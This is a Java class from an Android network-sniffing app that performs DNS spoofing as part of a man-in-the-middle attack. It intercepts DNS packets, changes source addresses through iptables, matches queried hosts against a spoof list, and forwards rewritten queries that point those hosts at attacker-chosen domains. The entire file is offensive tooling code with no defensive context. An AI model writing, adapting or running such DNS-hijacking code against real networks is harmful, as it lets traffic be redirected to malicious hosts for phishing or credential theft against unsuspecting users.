package su.sniff.cepter.Controller.Network;

import android.util.Log;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.util.ArrayList;

import su.sniff.cepter.Model.Pcap.DNSPacket;



public class                        MyDNSMITM {
    static ArrayList<HostFileEntry> entries;


    public                          MyDNSMITM(String packet) {
        parseRequest(packet);
    }
    /**
     *  parse request, search on host file entries list
     *  and send the request
     * @param packet
     */
    public static void              parseRequest(String packet) {
        DNSPacket dns = new DNSPacket(packet);    //create new object DNSPacket
        new IPTables().changeSource(dns.getSRCIp());//change source IP to Dns message src IP

        String queriedHost = dns.getQueriedHost();    //get queried Host (Hex)
        String printableHost = removeNonPrintableChars(queriedHost);//get only printable chars of queried Host
        //found entry on hosts file
        if ((dns.getQuerytype() == 1) && (findInEntriesList(printableHost) != null)) {//search on host file entries list
            //have to spoof the query
            String FakeDomain = findInEntriesList(printableHost);//get replacing domain
            String spoofedDNSReq = dns.getTransacionID() + "01000001000000000000" + FakeDomain + "00010001";//add common flags on type A request, A type and class 1
            sendQuery(spoofedDNSReq, dns.getSRCPort(), dns.getDSTIp());//send query
        } else {//not found entry on hosts file
            //send the original query
            String originlQuery = packet.replace(new String(dns.IP) + new String(dns.UDP), "");
            sendQuery(originlQuery, dns.getSRCPort(), dns.getDSTIp());
        }
        new IPTables().flushNAT();//flush NAT table
    }
    public static void              sendQuery(String DNSMessage, int srcport, String dstIP){
        try {
            DatagramSocket s = new DatagramSocket(srcport);
            byte[] data = hexStringToByteArray(DNSMessage);
            DatagramPacket p = new DatagramPacket(data, data.length, InetAddress.getByName(dstIP), 53);
            s.send(p);
            s.close();
        } catch (SocketException e) {
            Log.i("SocketException","socket exception: "+e.getMessage());
        } catch (IOException e) {
            Log.i("IOSocketException","IOException");
            e.printStackTrace();
        }
    }

    //finds domain on host File entries
    private static String            findInEntriesList(String s){
        String fakeDomain = null;
        for (int i = 0; i < entries.size(); i++) {
            if(s.equals(removeNonPrintableChars(entries.get(i).host2Spoof))){
                fakeDomain = entries.get(i).HexfakeHost;
                break;
            }
        }
        return fakeDomain;
    }

    private static byte[]            hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    private static String            removeNonPrintableChars(String S){
        String printable = "";
        for (int i = 0 ; i < S.length(); i++){
            if (isPrintable(S.charAt(i))){
                printable += S.charAt(i);
            }
        }
        return printable;
    }

    private static boolean           isPrintable(char c){
        return ((c >= 65 && c <= 90) || (c >= 97 && c <= 122));
    }

    private static class             HostFileEntry{
        String host2Spoof;	//domain to spoof
        String HexfakeHost;	//replacing domain

        public HostFileEntry(String host2spoof,String FakeHost){
            this.HexfakeHost=FakeHost;
            this.host2Spoof=host2spoof;
        }
    }
}
